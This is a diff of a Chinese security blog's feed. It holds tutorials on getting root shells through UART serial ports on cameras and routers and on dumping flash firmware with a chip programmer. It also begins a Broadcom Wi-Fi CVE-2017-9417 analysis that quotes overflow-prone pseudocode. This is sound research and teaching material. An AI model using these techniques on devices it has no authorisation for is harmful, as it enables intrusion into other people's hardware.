src="http://ozuqqvmm5.bkt.clouddn.com/image71.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image72.jpg" alt="img"></p>
-<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image73.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image35.jpg" alt="img"><br>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image74.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image75.jpg" alt="img"></p>
-<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image76.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image77.jpg" alt="img"><br>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image78.jpg" alt="img"></p>
-<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image79.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image80.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image81.jpg" alt="img"></p>
-<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image82.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image83.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image84.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image85.jpg" alt="img"><br>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image86.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image87.jpg" alt="img"></p>
-<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image88.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image89.jpg" alt="img"><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image90.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image91.jpg" alt="img"></p>
-<h3 id="案例六：调试某无线数据终端"><a href="#案例六：调试某无线数据终端" class="headerlink" title="案例六：调试某无线数据终端"></a>案例六：调试某无线数据终端</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image122.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image123.jpg" alt="img"><br>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image124.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image125.jpg" alt="img"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
     
   </entry>
   
@@ -226,6 +226,59 @@
   </entry>
   
   <entry>
+    <title>物联网硬件安全分析基础-固件提取</title>
+    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
+    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
+    <published>2017-11-26T16:00:00.000Z</published>
+    <updated>2017-11-27T11:00:50.268Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。</p>
+<h2 id="编程器读取"><a href="#编程器读取" class="headerlink" title="编程器读取"></a>编程器读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image36.jpg" alt="img"></p>
+<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image37.jpg" alt="img"></p>
+<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image38.jpg" alt="img"></p>
+<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image39.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image40.jpg" alt="img"></p>
+<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image41.jpg" alt="img"></p>
+<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image118.jpg" alt="img"></p>
+<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image42.jpg" alt="img"></p>
+<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image43.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image44.jpg" alt="img"></p>
+<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image45.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>
+<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image116.jpg" alt="img"></p>
+<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image47.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image48.jpg" alt="img"></p>
+<p>通过显微镜发现芯片型号为25L128。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image120.jpg" alt="img"></p>
+<p>连接编程器读取固件并保存。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image49.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image50.jpg" alt="img"></p>
+<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image52.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image119.jpg" alt="img"></p>
+<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image51.jpg" alt="img"></p>
+<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image54.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image53.jpg" alt="img"></p>
+<p>在编程器中选择该型号，成功提取出固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image55.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image56.jpg" alt="img"></p>
+<p>用binwalk解包固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image115.jpg" alt="img"></p>
+<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image57.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image58.jpg" alt="img"></p>
+<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image59.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image60.jpg" alt="img"></p>
+<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image62.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image121.jpg" alt="img"></p>
+<p>通过夹具连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image61.jpg" alt="img"></p>
+<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image63.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image64.jpg" alt="img"></p>
+<p>用binwalk解包固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image117.jpg" alt="img"></p>
+<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。<br>通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image92.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image93.jpg" alt="img"></p>
+<h3 id="热风枪和锡焊拆焊芯片读取固件"><a href="#热风枪和锡焊拆焊芯片读取固件" class="headerlink" title="热风枪和锡焊拆焊芯片读取固件"></a>热风枪和锡焊拆焊芯片读取固件</h3><p>设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image94.jpg" alt="img"></p>
+<p>读取芯片固件并导出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image95.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;/p&gt;
+&lt;h2 id=&quot;编程器读取&quot;&gt;
+    
+    </summary>
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
     <title>如何破解一个蓝牙锁</title>
     <link href="http://www.future-sec.com/how-to-crack-a-ble-lock.html"/>
     <id>http://www.future-sec.com/how-to-crack-a-ble-lock.html</id>
@@ -282,59 +335,6 @@
       <category term="智能锁" scheme="http://www.future-sec.com/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
     
       <category term="蓝牙攻击" scheme="http://www.future-sec.com/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>物联网硬件安全分析基础-固件提取</title>
-    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
-    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
-    <published>2017-11-26T16:00:00.000Z</published>
-    <updated>2017-11-27T11:00:50.268Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。</p>
-<h2 id="编程器读取"><a href="#编程器读取" class="headerlink" title="编程器读取"></a>编程器读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image36.jpg" alt="img"></p>
-<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image37.jpg" alt="img"></p>
-<p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image38.jpg" alt="img"></p>
-<p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image39.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image40.jpg" alt="img"></p>
-<h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image41.jpg" alt="img"></p>
-<p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image118.jpg" alt="img"></p>
-<p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image42.jpg" alt="img"></p>
-<p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image43.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image44.jpg" alt="img"></p>
-<p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image45.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>
-<p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image116.jpg" alt="img"></p>
-<h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image47.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image48.jpg" alt="img"></p>
-<p>通过显微镜发现芯片型号为25L128。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image120.jpg" alt="img"></p>
-<p>连接编程器读取固件并保存。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image49.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image50.jpg" alt="img"></p>
-<h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image52.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image119.jpg" alt="img"></p>
-<p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image51.jpg" alt="img"></p>
-<p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image54.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image53.jpg" alt="img"></p>
-<p>在编程器中选择该型号，成功提取出固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image55.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image56.jpg" alt="img"></p>
-<p>用binwalk解包固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image115.jpg" alt="img"></p>
-<h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image57.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image58.jpg" alt="img"></p>
-<p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image59.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image60.jpg" alt="img"></p>
-<h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image62.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image121.jpg" alt="img"></p>
-<p>通过夹具连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image61.jpg" alt="img"></p>
-<p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image63.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image64.jpg" alt="img"></p>
-<p>用binwalk解包固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image117.jpg" alt="img"></p>
-<h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。<br>通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image92.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image93.jpg" alt="img"></p>
-<h3 id="热风枪和锡焊拆焊芯片读取固件"><a href="#热风枪和锡焊拆焊芯片读取固件" class="headerlink" title="热风枪和锡焊拆焊芯片读取固件"></a>热风枪和锡焊拆焊芯片读取固件</h3><p>设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image94.jpg" alt="img"></p>
-<p>读取芯片固件并导出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image95.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;/p&gt;
-&lt;h2 id=&quot;编程器读取&quot;&gt;
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -455,6 +455,50 @@
   </entry>
   
   <entry>
+    <title>BROADCOM WI-FI芯片漏洞分析二</title>
+    <link href="http://www.future-sec.com/broadcom-wifi-2.html"/>
+    <id>http://www.future-sec.com/broadcom-wifi-2.html</id>
+    <published>2017-08-29T16:00:00.000Z</published>
+    <updated>2017-12-21T07:33:35.154Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
+<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
+<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
+<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    